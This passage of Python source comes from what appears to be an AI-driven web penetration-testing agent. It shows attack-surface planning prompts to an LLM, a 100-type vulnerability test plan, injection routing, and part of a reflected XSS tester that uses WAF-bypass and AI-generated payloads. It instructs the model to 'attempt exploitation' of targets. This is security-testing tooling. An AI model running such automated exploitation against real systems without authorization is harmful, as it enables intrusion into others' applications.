        vuln_type = tool_finding.get("vulnerability_type", "vulnerability")
        endpoint = tool_finding.get("affected_endpoint",
                                    tool_finding.get("url", self.target))
        evidence = tool_finding.get("evidence",
                                    tool_finding.get("matcher-name", ""))

        # Map to our vuln type system
        mapped_type = self.VULN_TYPE_MAP.get(vuln_type, vuln_type)

        # Check for duplicates
        if self.memory.has_finding_for(mapped_type, endpoint, ""):
            return

        finding_hash = hashlib.md5(
            f"{mapped_type}{endpoint}".encode()
        ).hexdigest()[:8]

        finding = Finding(
            id=finding_hash,
            title=f"[{tool_name.upper()}] {title}",
            severity=severity,
            vulnerability_type=mapped_type,
            affected_endpoint=endpoint,
            evidence=evidence or f"Detected by {tool_name}",
            description=tool_finding.get("description") or evidence or f"Detected by {tool_name}",
            remediation=tool_finding.get("remediation", ""),
            references=tool_finding.get("references", []),
            ai_verified=False,
            confidence="medium",
        )

        # Pull metadata from registry if available
        try:
            info = self.vuln_registry.get_vulnerability_info(mapped_type)
            if info:
                finding.cwe_id = finding.cwe_id or info.get("cwe_id", "")
                finding.description = finding.description or info.get("description", "")
                finding.cvss_score = finding.cvss_score or self._CVSS_SCORES.get(mapped_type, 0.0)
                finding.cvss_vector = finding.cvss_vector or self._CVSS_VECTORS.get(mapped_type, "")
        except Exception:
            pass

        # Generate PoC
        finding.poc_code = self.poc_generator.generate(
            mapped_type, endpoint, "", "", evidence
        )

        await self._add_finding(finding)
        self._stream_findings_count += 1

    async def _ai_analyze_attack_surface(self) -> Dict:
        """Use AI to analyze attack surface"""
        if not self.llm.is_available():
            return self._default_attack_plan()

        # Build detailed context for AI analysis
        endpoint_details = []
        for ep in self.recon.endpoints[:15]:
            url = _get_endpoint_url(ep)
            method = _get_endpoint_method(ep)
            parsed = urlparse(url)
            params = list(parse_qs(parsed.query).keys()) if parsed.query else []
            endpoint_details.append(f"  - [{method}] {parsed.path or '/'}" + (f" params: {params}" if params else ""))

        form_details = []
        for form in self.recon.forms[:10]:
            if isinstance(form, str):
                form_details.append(f"  - {form}")
                continue
            action = form.get('action', 'unknown') if isinstance(form, dict) else str(form)
            method = form.get('method', 'GET').upper() if isinstance(form, dict) else 'GET'
            inputs = form.get('inputs', []) if isinstance(form, dict) else []
            fields = []
            for f in inputs[:5]:
                if isinstance(f, str):
                    fields.append(f)
                elif isinstance(f, dict):
                    fields.append(f.get('name', 'unnamed'))
            form_details.append(f"  - [{method}] {action} fields: {fields}")

        context = f"""**Target Analysis Request**

Target: {self.target}
Scope: Web Application Security Assessment
User Instructions: {self.custom_prompt or DEFAULT_ASSESSMENT_PROMPT[:500]}

**Reconnaissance Summary:**

Technologies Detected: {', '.join(self.recon.technologies) if self.recon.technologies else 'Not yet identified'}

Endpoints Discovered ({len(self.recon.endpoints)} total):
{chr(10).join(endpoint_details) if endpoint_details else '  None yet'}

Forms Found ({len(self.recon.forms)} total):
{chr(10).join(form_details) if form_details else '  None yet'}

Parameters Identified: {list(self.recon.parameters.keys())[:15] if self.recon.parameters else 'None yet'}

API Endpoints: {self.recon.api_endpoints[:5] if self.recon.api_endpoints else 'None identified'}"""

        # Build available vuln types from knowledge base
        available_types = list(self.vuln_registry.VULNERABILITY_INFO.keys())
        kb_categories = self.knowledge_base.get("category_mappings", {})
        xbow_insights = self.knowledge_base.get("xbow_insights", {})

        # Execution history context (cross-scan learning)
        history_context = ""
        history_priority_str = ""
        if self.execution_history:
            try:
                history_context = self.execution_history.get_stats_for_prompt(
                    self.recon.technologies
                )
                history_priority = self.execution_history.get_priority_types(
                    self.recon.technologies, top_n=10
                )
                if history_priority:
                    history_priority_str = (
                        f"\n**Historically Effective Types for this tech stack:** "
                        f"{', '.join(history_priority[:10])}"
                    )
            except Exception:
                pass

        # Access control learning context (adaptive BOLA/BFLA/IDOR patterns)
        acl_context = ""
        if self.access_control_learner:
            try:
                domain = urlparse(self.target).netloc
                for acl_type in ["bola", "bfla", "idor", "privilege_escalation"]:
                    ctx = self.access_control_learner.get_learning_context(acl_type, domain)
                    if ctx:
                        acl_context += ctx + "\n"
            except Exception:
                pass

        # Knowledge augmentation from bug bounty patterns + custom uploaded knowledge
        knowledge_context = ""
        # RAG-enhanced retrieval (semantic search when available)
        rag_strategy_context = ""
        rag_memory_context = ""
        few_shot_strategy = ""
        if self.rag_engine:
            try:
                rag_strategy_context = self.rag_engine.get_strategy_context(
                    technologies=self.recon.technologies[:5],
                    endpoints=[_get_endpoint_url(ep) for ep in self.recon.endpoints[:5]],
                    max_chars=2000
                )
            except Exception:
                pass
            # Few-shot strategy examples
            if self.few_shot_selector:
                try:
                    few_shot_strategy = self.few_shot_selector.get_strategy_examples(
                        technologies=self.recon.technologies[:3],
                        max_examples=2
                    )
                except Exception:
                    pass
            # Reasoning memory: accumulated strategy knowledge
            if self.reasoning_memory:
                try:
                    rag_memory_context = self.reasoning_memory.get_strategy_context(
                        technologies=self.recon.technologies[:5],
                        max_chars=1000
                    )
                except Exception:
                    pass

        # Fallback to keyword-based augmentor if no RAG
        if not rag_strategy_context:
            try:
                from core.knowledge_augmentor import KnowledgeAugmentor
                augmentor = KnowledgeAugmentor()
                for tech in self.recon.technologies[:3]:
                    patterns = augmentor.get_relevant_patterns_with_custom(
                        vulnerability_type=tech, technologies=[tech]
                    )
                    if patterns:
                        knowledge_context += patterns[:500] + "\n"
            except Exception:
                pass

        # Adaptive learner context (cross-scan learning from TP/FP feedback)
        adaptive_context = ""
        if self.adaptive_learner:
            try:
                domain = urlparse(self.target).netloc
                for vt in ["xss", "sqli", "ssrf", "idor", "rce", "ssti", "lfi"]:
                    ctx = self.adaptive_learner.get_learning_context(vt, domain)
                    if ctx:
                        adaptive_context += ctx + "\n"
            except Exception:
                pass

        # Custom prompts context for strategy phase
        custom_prompt_context = self._build_custom_prompt_context("strategy") if self.loaded_custom_prompts else ""

        # Playbook: tech-stack-aware methodology recommendations
        playbook_strategy_ctx = ""
        if HAS_PLAYBOOK:
            try:
                playbook_summary = get_playbook_summary()
                tech_lower = [t.lower() for t in (self.recon.technologies or [])]
                recommended_types = set()
                # Check each playbook vuln type for tech-relevance
                for category, vtypes in playbook_summary.items():
                    for vtype in vtypes:
                        entry = get_playbook_entry(vtype)
                        if entry:
                            overview = entry.get("overview", "").lower()
                            discovery = " ".join(entry.get("discovery", [])).lower()
                            combined = overview + " " + discovery
                            for tech in tech_lower:
                                tech_name = tech.split("/")[0].strip().lower()
                                if tech_name in combined and len(tech_name) > 2:
                                    recommended_types.add(vtype)
                if recommended_types:
                    playbook_strategy_ctx = (
                        f"\n**Playbook-Recommended Types for Detected Tech Stack:** "
                        f"{', '.join(sorted(recommended_types)[:20])}\n"
                    )
                    # Add top chain attack opportunities
                    chain_hints = []
                    for vtype in list(recommended_types)[:10]:
                        chains = get_chain_attacks(vtype)
                        if chains:
                            chain_hints.append(f"  - {vtype}: {', '.join(chains[:2])}")
                    if chain_hints:
                        playbook_strategy_ctx += f"**Chain Attack Opportunities:**\n" + "\n".join(chain_hints[:5]) + "\n"
            except Exception:
                pass

        prompt = f"""Analyze this attack surface and create a prioritized, focused testing plan.

{context}

**Available Vulnerability Types (100 types from VulnEngine):**
{', '.join(available_types)}

**Vulnerability Categories:**
{json.dumps(kb_categories, indent=2)}

**XBOW Benchmark Insights:**
- Default credentials: Check admin panels with {xbow_insights.get('default_credentials', {}).get('common_creds', [])[:5]}
- Deserialization: Watch for {xbow_insights.get('deserialization', {}).get('frameworks', [])}
- Business logic: Test for {xbow_insights.get('business_logic', {}).get('patterns', [])}
- IDOR techniques: {xbow_insights.get('idor', {}).get('techniques', [])}
{f'''
**Historical Attack Success Rates (technology → vuln type: successes/total):**
{history_context}
{history_priority_str}''' if history_context else ''}
{f'''
**Bug Bounty Pattern Context:**
{knowledge_context[:800]}''' if knowledge_context else ''}{f'''

{rag_strategy_context}''' if rag_strategy_context else ''}{f'''

{few_shot_strategy}''' if few_shot_strategy else ''}{f'''

{rag_memory_context}''' if rag_memory_context else ''}
{f'''
**Access Control Learning (Adaptive BOLA/BFLA/IDOR Patterns):**
{acl_context[:800]}''' if acl_context else ''}{f'''

**Adaptive Learning (Cross-Scan TP/FP Feedback):**
{adaptive_context[:800]}''' if adaptive_context else ''}{f'''

{playbook_strategy_ctx}''' if playbook_strategy_ctx else ''}

**Analysis Requirements:**

1. **Technology-Based Prioritization:**
   - If PHP detected → lfi, command_injection, ssti, sqli_error, file_upload, path_traversal
   - If ASP.NET/Java → xxe, insecure_deserialization, expression_language_injection, file_upload, sqli_error
   - If Node.js → nosql_injection, ssrf, prototype_pollution, ssti, command_injection
   - If Python/Django/Flask → ssti, command_injection, idor, mass_assignment
   - If API/REST → idor, bola, bfla, jwt_manipulation, auth_bypass, mass_assignment, rate_limit_bypass
   - If GraphQL → graphql_introspection, graphql_injection, graphql_dos
   - Always include: security_headers, cors_misconfig, clickjacking, ssl_issues

2. **High-Risk Endpoint Identification:**
   - Login/authentication endpoints
   - File upload/download functionality
   - Admin/management interfaces
   - API endpoints with user input
   - Search/query parameters

3. **Parameter Risk Assessment:**
   - Parameters named: id, user, file, path, url, redirect, callback
   - Hidden form fields
   - Parameters accepting complex input

4. **Attack Vector Suggestions:**
   - Specific payloads based on detected technologies
   - Chained attack scenarios
   - Business logic flaws to test

**IMPORTANT:** Use the exact vulnerability type names from the available types list above.

**Respond in JSON format:**
{{
    "priority_vulns": ["sqli_error", "xss_reflected", "idor", "lfi", "security_headers"],
    "high_risk_endpoints": ["/api/users", "/admin/upload"],
    "focus_parameters": ["id", "file", "redirect"],
    "attack_vectors": [
        "Test user ID parameter for IDOR",
        "Check file upload for unrestricted types",
        "Test search parameter for SQL injection"
    ],
    "technology_specific_tests": ["PHP: test include parameters", "Check for Laravel debug mode"]
}}"""

        try:
            response = await self.llm.generate(prompt,
                self._get_enhanced_system_prompt("playbook"))
            match = re.search(r'\{.*\}', response, re.DOTALL)
            if match:
                return json.loads(match.group())
        except Exception as e:
            await self.log("debug", f"AI analysis error: {e}")

        return self._default_attack_plan()

    def _default_attack_plan(self) -> Dict:
        """Default attack plan with 5-tier coverage (100 vuln types)"""
        return {
            "priority_vulns": [
                # P1 - Critical: RCE, SQLi, auth bypass — immediate full compromise
                "sqli_error", "sqli_union", "command_injection", "ssti",
                "auth_bypass", "insecure_deserialization", "rfi", "file_upload",
                # P2 - High: data access, SSRF, privilege issues
                "xss_reflected", "xss_stored", "lfi", "ssrf", "ssrf_cloud",
                "xxe", "path_traversal", "idor", "bola",
                "sqli_blind", "sqli_time", "jwt_manipulation",
                "privilege_escalation", "arbitrary_file_read",
                # P3 - Medium: injection variants, logic, auth weaknesses
                "nosql_injection", "ldap_injection", "xpath_injection",
                "blind_xss", "xss_dom", "cors_misconfig", "csrf",
                "open_redirect", "session_fixation", "bfla",
                "mass_assignment", "race_condition", "host_header_injection",
                "http_smuggling", "subdomain_takeover",
                # P4 - Low: config, client-side, data exposure
                "security_headers", "clickjacking", "http_methods", "ssl_issues",
                "directory_listing", "debug_mode", "exposed_admin_panel",
                "exposed_api_docs", "insecure_cookie_flags",
                "sensitive_data_exposure", "information_disclosure",
                "api_key_exposure", "version_disclosure",
                "crlf_injection", "header_injection", "prototype_pollution",
                # P5 - Info/AI-driven: supply chain, crypto, cloud, niche
                "graphql_introspection", "graphql_dos", "graphql_injection",
                "cache_poisoning", "parameter_pollution", "type_juggling",
                "business_logic", "rate_limit_bypass", "timing_attack",
                "weak_encryption", "weak_hashing", "cleartext_transmission",
                "vulnerable_dependency", "s3_bucket_misconfiguration",
                "cloud_metadata_exposure", "soap_injection",
                "source_code_disclosure", "backup_file_exposure",
                "csv_injection", "html_injection", "log_injection",
                "email_injection", "expression_language_injection",
                "mutation_xss", "dom_clobbering", "postmessage_vulnerability",
                "websocket_hijacking", "css_injection", "tabnabbing",
                "default_credentials", "weak_password", "brute_force",
                "two_factor_bypass", "oauth_misconfiguration",
                "forced_browsing", "arbitrary_file_delete", "zip_slip",
                "orm_injection", "improper_error_handling",
                "weak_random", "insecure_cdn", "outdated_component",
                "container_escape", "serverless_misconfiguration",
                "rest_api_versioning", "api_rate_limiting",
                "excessive_data_exposure",
            ],
            "high_risk_endpoints": [_get_endpoint_url(e) for e in self.recon.endpoints[:10]],
            "focus_parameters": [],
            "attack_vectors": []
        }

    # Types that need parameter injection testing (payload → param → endpoint)
    INJECTION_TYPES = {
        # SQL injection
        "sqli_error", "sqli_union", "sqli_blind", "sqli_time",
        # XSS
        "xss_reflected", "xss_stored", "xss_dom", "blind_xss", "mutation_xss",
        # Command/template
        "command_injection", "ssti", "expression_language_injection",
        # NoSQL/LDAP/XPath/ORM
        "nosql_injection", "ldap_injection", "xpath_injection",
        "orm_injection", "graphql_injection",
        # File access
        "lfi", "rfi", "path_traversal", "xxe", "arbitrary_file_read",
        # SSRF/redirect
        "ssrf", "ssrf_cloud", "open_redirect",
        # Header/protocol injection
        "crlf_injection", "header_injection", "host_header_injection",
        "http_smuggling", "parameter_pollution",
        # Other injection-based
        "log_injection", "html_injection", "csv_injection",
        "email_injection", "prototype_pollution", "soap_injection",
        "type_juggling", "cache_poisoning",
    }

    # Types tested via header/response inspection (no payload injection needed)
    INSPECTION_TYPES = {
        "security_headers", "clickjacking", "http_methods", "ssl_issues",
        "cors_misconfig", "csrf",
        "directory_listing", "debug_mode", "exposed_admin_panel",
        "exposed_api_docs", "insecure_cookie_flags",
        "sensitive_data_exposure", "information_disclosure",
        "api_key_exposure", "version_disclosure",
        "cleartext_transmission", "weak_encryption", "weak_hashing",
        "source_code_disclosure", "backup_file_exposure",
        "graphql_introspection",
    }

    # Injection point routing: where to inject payloads for each vuln type
    # Types not listed here default to "parameter" injection
    VULN_INJECTION_POINTS = {
        # Header-based injection
        "crlf_injection": {"point": "header", "headers": ["X-Forwarded-For", "Referer", "User-Agent"]},
        "header_injection": {"point": "header", "headers": ["X-Forwarded-For", "Referer", "X-Custom-Header"]},
        "host_header_injection": {"point": "header", "headers": ["Host", "X-Forwarded-Host", "X-Host"]},
        "http_smuggling": {"point": "header", "headers": ["Transfer-Encoding", "Content-Length"]},
        # Path-based injection
        "path_traversal": {"point": "both", "path_prefix": True},
        "lfi": {"point": "both", "path_prefix": True},
        # Body-based injection (XML)
        "xxe": {"point": "body", "content_type": "application/xml"},
        # Parameter-based remains default for all other types
    }

    # Types requiring AI-driven analysis (no simple payload/inspection test)
    AI_DRIVEN_TYPES = {
        "auth_bypass", "jwt_manipulation", "session_fixation",
        "weak_password", "default_credentials", "brute_force",
        "two_factor_bypass", "oauth_misconfiguration",
        "idor", "bola", "bfla", "privilege_escalation",
        "mass_assignment", "forced_browsing",
        "race_condition", "business_logic", "rate_limit_bypass",
        "timing_attack", "insecure_deserialization",
        "file_upload", "arbitrary_file_delete", "zip_slip",
        "dom_clobbering", "postmessage_vulnerability",
        "websocket_hijacking", "css_injection", "tabnabbing",
        "subdomain_takeover", "cloud_metadata_exposure",
        "s3_bucket_misconfiguration", "serverless_misconfiguration",
        "container_escape", "vulnerable_dependency", "outdated_component",
        "insecure_cdn", "weak_random",
        "graphql_dos", "rest_api_versioning", "api_rate_limiting",
        "excessive_data_exposure", "improper_error_handling",
    }

    async def _test_all_vulnerabilities(self, plan: Dict):
        """Test for all vulnerability types (100-type coverage)"""
        vuln_types = plan.get("priority_vulns", list(self._default_attack_plan()["priority_vulns"]))
        await self.log("info", f"  Testing {len(vuln_types)} vulnerability types")

        # ── Orchestrated path: dispatch to per-type agents ──
        if self._vuln_orchestrator:
            await self.log("info", f"  [VULN-AGENTS] Dispatching {len(vuln_types)} types to per-type agents")
            test_targets = self._build_test_targets()
            await self.log("info", f"  [VULN-AGENTS] {len(test_targets)} targets, max {self._vuln_orchestrator.max_concurrent} concurrent agents")
            orch_result = await self._vuln_orchestrator.run(vuln_types, test_targets, vuln_types)
            stats = orch_result.get("stats", {})
            await self.log("info",
                f"  [VULN-AGENTS] Complete: {stats.get('findings_total', 0)} findings, "
                f"{stats.get('completed', 0)}/{stats.get('total', 0)} agents done in {stats.get('elapsed', 0)}s"
            )
            return

        # ── Sequential path (default) ──

        # Get testable endpoints
        test_targets = []

        # Add endpoints with parameters (extract params from URL if present)
        for endpoint in self.recon.endpoints[:20]:
            url = _get_endpoint_url(endpoint)
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            if parsed.query:
                params = list(parse_qs(parsed.query).keys())
                test_targets.append({
                    "url": base_url,
                    "method": "GET",
                    "params": params,
                    "original_url": url
                })
                await self.log("debug", f"  Found endpoint with params: {url[:60]}... params={params}")
            elif url in self.recon.parameters:
                test_targets.append({"url": url, "method": "GET", "params": self.recon.parameters[url]})

        # Add forms (carry input_details for POST body context)
        for form in self.recon.forms[:10]:
            # Build default values dict from form fields (hidden fields, CSRF tokens, etc.)
            form_defaults = {}
            for detail in form.get('input_details', []):
                name = detail.get('name', '')
                if name and detail.get('value'):
                    form_defaults[name] = detail['value']
            test_targets.append({
                "url": form['action'],
                "method": form['method'],
                "params": form.get('inputs', []),
                "form_defaults": form_defaults,
            })

        # If no parameterized endpoints, test base endpoints with common params
        if not test_targets:
            await self.log("warning", "  No parameterized endpoints found, testing with common params")
            for endpoint in self.recon.endpoints[:5]:
                test_targets.append({
                    "url": _get_endpoint_url(endpoint),
                    "method": "GET",
                    "params": ["id", "q", "search", "page", "file", "url", "cat", "artist", "item"]
                })

        # Also test the main target with common params
        test_targets.append({
            "url": self.target,
            "method": "GET",
            "params": ["id", "q", "search", "page", "file", "url", "path", "redirect", "cat", "item"]
        })

        await self.log("info", f"  Total targets to test: {len(test_targets)}")

        # Route types into three categories
        injection_types = [v for v in vuln_types if v in self.INJECTION_TYPES]
        inspection_types = [v for v in vuln_types if v in self.INSPECTION_TYPES]
        ai_types = [v for v in vuln_types if v in self.AI_DRIVEN_TYPES]

        # ── Phase A: Inspection-based tests (fast, no payload injection) ──
        if inspection_types:
            await self.log("info", f"  Running {len(inspection_types)} inspection tests")

            # Security headers & clickjacking
            if any(t in inspection_types for t in ("security_headers", "clickjacking", "insecure_cookie_flags")):
                await self._test_security_headers("security_headers")

            # CORS
            if "cors_misconfig" in inspection_types:
                await self._test_cors()

            # Info disclosure / version / headers
            if any(t in inspection_types for t in (
                "http_methods", "information_disclosure", "version_disclosure",
                "sensitive_data_exposure",
            )):
                await self._test_information_disclosure()

            # Misconfigurations (directory listing, debug mode, admin panels, API docs)
            misconfig_types = {"directory_listing", "debug_mode", "exposed_admin_panel", "exposed_api_docs"}
            if misconfig_types & set(inspection_types):
                await self._test_misconfigurations()

            # Data exposure (source code, backups, API keys)
            data_types = {"source_code_disclosure", "backup_file_exposure", "api_key_exposure"}
            if data_types & set(inspection_types):
                await self._test_data_exposure()

            # SSL/TLS & crypto
            if any(t in inspection_types for t in ("ssl_issues", "cleartext_transmission", "weak_encryption", "weak_hashing")):
                await self._test_ssl_crypto()

            # GraphQL introspection
            if "graphql_introspection" in inspection_types:
                await self._test_graphql_introspection()

            # CSRF
            if "csrf" in inspection_types:
                await self._test_csrf_inspection()

        # ── Phase B0: Stored XSS - special two-phase form-based testing ──
        if "xss_stored" in injection_types:
            # If no forms found during recon, crawl discovered endpoints to find them
            if not self.recon.forms:
                await self.log("info", "  [STORED XSS] No forms in recon - crawling endpoints to discover forms...")
                for ep in self.recon.endpoints[:15]:
                    ep_url = _get_endpoint_url(ep)
                    if ep_url:
                        await self._crawl_page(ep_url)
                if self.recon.forms:
                    await self.log("info", f"  [STORED XSS] Discovered {len(self.recon.forms)} forms from endpoint crawl")

        if "xss_stored" in injection_types and self.recon.forms:
            await self.log("info", f"  [STORED XSS] Two-phase testing against {len(self.recon.forms)} forms")
            for form in self.recon.forms[:10]:
                await self._wait_if_paused()
                if self.is_cancelled():
                    return
                finding = await self._test_stored_xss(form)
                if finding:
                    await self._add_finding(finding)
            # Remove xss_stored from generic injection loop (already tested via forms)
            injection_types = [v for v in injection_types if v != "xss_stored"]

        # ── Phase B0.5: Reflected XSS - dedicated context-aware testing ──
        if "xss_reflected" in injection_types:
            await self.log("info", f"  [REFLECTED XSS] Context-aware testing against {len(test_targets)} targets")
            for target in test_targets:
                await self._wait_if_paused()
                if self.is_cancelled():
                    return
                t_url = target.get('url', '')
                t_params = target.get('params', [])
                t_method = target.get('method', 'GET')
                t_form_defaults = target.get('form_defaults', {})
                finding = await self._test_reflected_xss(t_url, t_params, t_method, t_form_defaults)
                if finding:
                    await self._add_finding(finding)
            injection_types = [v for v in injection_types if v != "xss_reflected"]

        # ── Phase B: Injection-based tests (AI-first with hardcoded fallback) ──
        if injection_types:
            # Split injection types: AI-deep for top priority, hardcoded for rest
            ai_deep_budget = 15  # AI deep test for top 15 types
            if self.token_budget and hasattr(self.token_budget, 'remaining'):
                try:
                    remaining = self.token_budget.remaining()
                    if remaining and remaining < 50000:
                        ai_deep_budget = 5  # Low budget: fewer AI tests
                except Exception:
                    pass

            ai_deep_types = injection_types[:ai_deep_budget] if self.llm.is_available() else []
            fallback_types = injection_types[ai_deep_budget:] if self.llm.is_available() else injection_types

            if ai_deep_types:
                await self.log("info",
                    f"  [AI-DEEP] AI-first testing for {len(ai_deep_types)} priority types "
                    f"against {len(test_targets)} targets")

            for target in test_targets:
                await self._wait_if_paused()
                if self.is_cancelled():
                    await self.log("warning", "Scan cancelled by user")
                    return

                url = target.get('url', '')
                t_method = target.get('method', 'GET')
                t_params = target.get('params', [])
                t_form_defaults = target.get('form_defaults', {})

                # Strategy: skip dead endpoints
                if self.strategy and not self.strategy.should_test_endpoint(url):
                    await self.log("debug", f"  [STRATEGY] Skipping dead endpoint: {url[:60]}")
                    continue

                await self.log("info", f"  Testing: {url[:60]}...")

                # ── AI-First: Iterative deep test for priority types ──
                for vuln_type in ai_deep_types:
                    await self._wait_if_paused()
                    if self.is_cancelled():
                        return

                    if self.strategy and not self.strategy.should_test_type(vuln_type, url):
                        continue

                    # Try AI deep test first
                    finding = await self._ai_deep_test(
                        url, vuln_type, t_params, t_method, t_form_defaults
                    )
                    if finding:
                        await self._add_finding(finding)
                        if self.strategy:
                            self.strategy.record_test_result(url, vuln_type, 200, True, 0)
                        continue  # AI found it, no fallback needed

                    # AI deep test found nothing — fall back to hardcoded payloads
                    finding = await self._test_vulnerability_type(
                        url, vuln_type, t_method, t_params,
                        form_defaults=t_form_defaults
                    )
                    if finding:
                        await self._add_finding(finding)
                        if self.strategy:
                            self.strategy.record_test_result(url, vuln_type, 200, True, 0)
                    elif self.strategy:
                        self.strategy.record_test_result(url, vuln_type, 0, False, 0)

                # ── Hardcoded fallback: remaining injection types ──
                for vuln_type in fallback_types:
                    await self._wait_if_paused()
                    if self.is_cancelled():
                        return

                    if self.strategy and not self.strategy.should_test_type(vuln_type, url):
                        continue

                    finding = await self._test_vulnerability_type(
                        url, vuln_type, t_method, t_params,
                        form_defaults=t_form_defaults
                    )
                    if finding:
                        await self._add_finding(finding)
                        if self.strategy:
                            self.strategy.record_test_result(url, vuln_type, 200, True, 0)
                    elif self.strategy:
                        self.strategy.record_test_result(url, vuln_type, 0, False, 0)

                # Strategy: recompute priorities periodically
                if self.strategy and self.strategy.should_recompute_priorities():
                    injection_types = self.strategy.recompute_priorities(injection_types)
                    ai_deep_types = injection_types[:ai_deep_budget] if self.llm.is_available() else []
                    fallback_types = injection_types[ai_deep_budget:] if self.llm.is_available() else injection_types

        # ── Phase B+: AI-suggested additional tests ──
        if self.llm.is_available() and self.memory.confirmed_findings:
            findings_summary = "\n".join(
                f"- {f.title} ({f.severity}) at {f.affected_endpoint}"
                for f in self.memory.confirmed_findings[:20]
            )
            target_urls = [t.get('url', '') for t in test_targets[:5]]
            suggested = await self._ai_suggest_next_tests(findings_summary, target_urls)
            if suggested:
                await self.log("info", f"  [AI] Suggested additional tests: {', '.join(suggested)}")
                for vt in suggested[:5]:
                    if vt in injection_types or vt in inspection_types:
                        continue  # Already tested
                    await self._wait_if_paused()
                    if self.is_cancelled():
                        return
                    for target in test_targets[:3]:
                        finding = await self._test_vulnerability_type(
                            target.get('url', ''), vt,
                            target.get('method', 'GET'),
                            target.get('params', [])
                        )
                        if finding:
                            await self._add_finding(finding)

        # ── Phase C: AI-driven tests (iterative deep test for AI-only types) ──
        if ai_types and self.llm.is_available():
            ai_priority = ai_types[:15]
            await self.log("info",
                f"  [AI-DEEP] AI-driven iterative testing for {len(ai_priority)} types: "
                f"{', '.join(ai_priority[:5])}...")
            for vt in ai_priority:
                await self._wait_if_paused()
                if self.is_cancelled():
                    return

                # Use AI deep test with endpoint-specific context
                for target in test_targets[:3]:
                    t_url = target.get('url', self.target)
                    t_params = target.get('params', [])
                    t_method = target.get('method', 'GET')
                    t_form_defaults = target.get('form_defaults', {})

                    finding = await self._ai_deep_test(
                        t_url, vt, t_params, t_method, t_form_defaults
                    )
                    if finding:
                        await self._add_finding(finding)
                        break  # Found on one endpoint, move to next type

                # Fallback to original _ai_dynamic_test for types not found via deep test
                if not any(f.vulnerability_type == vt for f in self.findings):
                    await self._ai_dynamic_test(
                        f"Test the target {self.target} for {vt} vulnerability. "
                        f"Analyze the application behavior, attempt exploitation, "
                        f"and report only confirmed findings."
                    )

    async def _test_reflected_xss(
        self, url: str, params: List[str], method: str = "GET",
        form_defaults: Dict = None
    ) -> Optional[Finding]:
        """Dedicated reflected XSS testing with filter detection + context analysis + AI.

        1. Canary probe each param to find reflection points
        2. Enhanced context detection at each reflection
        3. Filter detection to map what's blocked
        4. Build payload list: AI-generated + escalation + context payloads
        5. Test with per-payload dedup

        form_defaults: pre-filled values from HTML form fields (hidden inputs, CSRF tokens, etc.)
                       Used for POST form testing so all required fields are included.
        """
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        existing_params = parse_qs(parsed.query) if parsed.query else {}
        # For POST forms, merge form defaults into existing_params so all fields are included
        if form_defaults and method.upper() != "GET":
            for k, v in form_defaults.items():
                if k not in existing_params:
                    existing_params[k] = v
        test_params = params if params else list(existing_params.keys())
        if not test_params:
            test_params = ["id", "q", "search", "page", "file", "url"]

        for param in test_params[:8]:
            if self.memory.was_tested(base_url, param, "xss_reflected"):
                continue

            # Step 1: Canary probe to find reflection
            canary = f"nsxss{hashlib.md5(f'{base_url}{param}'.encode()).hexdigest()[:6]}"
            test_data = {param: canary}
            for k, v in existing_params.items():
                if k != param:
                    test_data[k] = v[0] if isinstance(v, list) else v

            # Follow redirects for POST forms (search forms often POST then render results)
            follow = method.upper() != "GET"
            canary_resp = await self._make_request(base_url, method, test_data,
                                                    follow_redirects=follow)
            if not canary_resp or canary not in canary_resp.get("body", ""):
                self.memory.record_test(base_url, param, "xss_reflected", [canary], False)
                continue

            await self.log("info", f"    [{param}] Canary reflected! Analyzing context...")

            # Step 2: Enhanced context detection
            context_info = self._detect_xss_context_enhanced(canary_resp["body"], canary)
            context = context_info["context"]
            await self.log("info", f"    [{param}] Context: {context} "
                          f"(tag={context_info.get('enclosing_tag', '')}, "
                          f"attr={context_info.get('attribute_name', '')})")

            # Step 3: Filter detection (set form defaults for POST probe requests)
            self._current_xss_form_defaults = existing_params if method.upper() != "GET" else {}
            filter_map = await self._detect_xss_filters(base_url, param, method)
            self._current_xss_form_defaults = {}  # clean up

            # Step 4: Build payload list (with FP learning feedback)
            # Query reasoning memory to avoid known-failed payloads and prioritize successes
            avoid_payloads: set = set()
            historical_payloads: List[str] = []
            if hasattr(self, 'reasoning_memory') and self.reasoning_memory:
                try:
                    tech_stack = ", ".join(self.recon.technologies[:3]) if self.recon.technologies else ""
                    failures = self.reasoning_memory.get_failure_patterns("xss_reflected", tech_stack)
                    for f in failures:
                        for p in f.get("attempted_payloads", []):
                            avoid_payloads.add(p)
                    traces = self.reasoning_memory.get_relevant_traces("xss_reflected", tech_stack)
                    for t in traces:
                        p_used = t.get("payload_used", "")
                        if p_used and p_used not in avoid_payloads:
                            historical_payloads.append(p_used)
                except Exception:
                    pass

            context_payloads = self.payload_generator.get_context_payloads(context)
            escalation = self._escalation_payloads(filter_map, context)
            bypass_payloads = self.payload_generator.get_filter_bypass_payloads(filter_map)

            challenge_hint = self.lab_context.get("challenge_name", "") or ""
            if self.lab_context.get("notes"):
                challenge_hint += f" | {self.lab_context['notes']}"
            ai_payloads = await self._ai_generate_xss_payloads(
                filter_map, context_info, challenge_hint
            )

            # Merge and deduplicate: historical successes first, then AI/escalation/context
            seen: set = set()
            payloads: List[str] = []
            # Prioritize historically successful payloads
            for p in historical_payloads:
                if p not in seen and p not in avoid_payloads:
                    seen.add(p)
                    payloads.append(p)
            for p in (ai_payloads + escalation + bypass_payloads + context_payloads):
                if p not in seen and p not in avoid_payloads:
                    seen.add(p)
                    payloads.append(p)

            if not payloads:
                payloads = self._get_payloads("xss_reflected")

            # WAF adaptation: apply bypass techniques to ALL payloads
            if self._waf_result and self._waf_result.detected_wafs and self.waf_detector:
                try:
                    payloads = self.waf_detector.adapt_payload_set_with_originals(
                        payloads, waf_result=self._waf_result, vuln_type="xss_reflected"
                    )
                except Exception:
                    pass

            await self.log("info", f"    [{param}] Testing {len(payloads)} payloads "
                          f"(AI={len(ai_payloads)}, esc={len(escalation)}, ctx={len(context_payloads)})")

            # Step 5: Test payloads
            tester = self.vuln_registry.get_tester("xss_reflected")
            baseline_resp = self.memory.get_baseline(base_url)
            if not baseline_resp:
                baseline_resp = await self._make_request(base_url, method, {param: "safe123test"})
                if baseline_resp:
                    self.memory.store_baseline(base_url, baseline_resp)

            for i, payload in enumerate(payloads[:30]):
                await self._wait_if_paused()
                if self.is_cancelled():
                    return None

                payload_hash = hashlib.md5(payload.encode()).hexdigest()[:8]
                dedup_param = f"{param}|{payload_hash}"
